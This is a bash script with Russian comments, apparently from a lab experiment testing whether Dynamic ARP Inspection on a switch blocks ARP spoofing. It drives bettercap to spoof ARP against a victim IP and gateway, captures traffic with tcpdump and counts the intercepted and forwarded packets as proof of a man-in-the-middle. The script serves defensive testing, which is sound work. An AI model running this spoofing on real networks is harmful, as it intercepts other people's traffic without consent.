#!/usr/bin/env bash
# =====================================================================
#  Kali — прогон с ДОКАЗАТЕЛЬСТВОМ перехвата служебного трафика.
#  Своим же ICMP (ping жертвы -> шлюз) показываем, что при MITM пакеты
#  жертвы приходят на Kali (L3 dst = шлюз, но L2 dst = MAC Kali).
#
#  Запуск:  sudo ./kali_intercept.sh eth0 192.168.10.11 25 eltex_off_07
#  аргументы:  iface  IP-жертвы  длительность_сек  метка  [шлюз]
#
#  Делай ТОЛЬКО на прогоне БЕЗ защиты (DAI выкл) — там перехват должен
#  состояться. На прогоне с DAI вкл IN/FWD должны быть ~0 (перехвата нет).
#  Параллельно на жертве гони ping с меткой (trial.sh), чтобы было что ловить.
# =====================================================================
set -u
IF=${1:-eth0}
VIP=${2:?укажи IP жертвы, напр. 192.168.10.11}
DUR=${3:-25}
TAG=${4:-trial}
GW=${5:-192.168.10.1}
mkdir -p pcaps logs
PCAP="pcaps/${TAG}.pcap"
LOG="logs/kali_${TAG}.log"
KMAC=$(cat /sys/class/net/"$IF"/address)

echo "== $(date -Is)  перехват-прогон $TAG по $VIP, ${DUR}c, Kali MAC $KMAC" | tee "$LOG"

# 1. Захват в фоне — только служебный трафик (ARP + ICMP жертвы/шлюза)
sudo tcpdump -i "$IF" -e -w "$PCAP" "arp or (icmp and (host $VIP or host $GW))" 2>>"$LOG" &
TPID=$!
sleep 2

# 2. Атака (включили -> подержали -> чисто выключили -> вышли)
(
  sleep 2
  echo "set arp.spoof.targets $VIP"
  echo "set arp.spoof.fullduplex true"
  echo "set net.sniff.verbose false"
  echo "net.recon on"
  echo "net.probe on"          # активно находим хосты, иначе bettercap не знает MAC цели
  sleep 6                      # даём recon найти жертву ДО травли
  echo "arp.spoof on"
  sleep "$DUR"
  echo "arp.spoof off"
  sleep 2
  echo "net.probe off"
  echo "q"
) | sudo bettercap -iface "$IF" -no-colors 2>&1 | tee -a "$LOG"

# 3. Остановить захват
sudo kill "$TPID" 2>/dev/null; sleep 1

# 4. Подсчёт по pcap
ARP_SENT=$(sudo tcpdump -r "$PCAP" -n -e "arp and ether src $KMAC" 2>/dev/null | grep -c "$GW is-at")
IN=$(sudo tcpdump -r "$PCAP" -n -e "icmp and src host $VIP and ether dst $KMAC" 2>/dev/null | wc -l)
FWD=$(sudo tcpdump -r "$PCAP" -n -e "icmp and src host $VIP and ether src $KMAC" 2>/dev/null | wc -l)

CSV=kali_intercept.csv
[ -f "$CSV" ] || echo "time,tag,victim_ip,arp_sent,victim_pkts_in,forwarded,pcap" > "$CSV"
echo "$(date -Is),$TAG,$VIP,$ARP_SENT,$IN,$FWD,$PCAP" >> "$CSV"

echo
echo "Поддельных ARP от Kali ($GW is-at $KMAC): $ARP_SENT     -> событие 1 (атака шла)"
echo "Пакетов жертвы пришло на Kali (eth.dst=$KMAC): $IN       -> ПЕРЕХВАТ служебного трафика"
echo "Из них переслано к шлюзу (eth.src=$KMAC): $FWD           -> MITM с пересылкой"
echo "pcap: $PCAP"
echo
echo "Для скриншота в Wireshark открой $PCAP и поставь фильтр:"
echo "  icmp && ip.src==$VIP && eth.dst==$KMAC"
echo "каждая строка = пакет жертвы к шлюзу, пришедший на Kali = доказательство перехвата."
echo "Доля перенаправленного = $IN / (сколько жертва отправила, берёшь из trial.sh)."
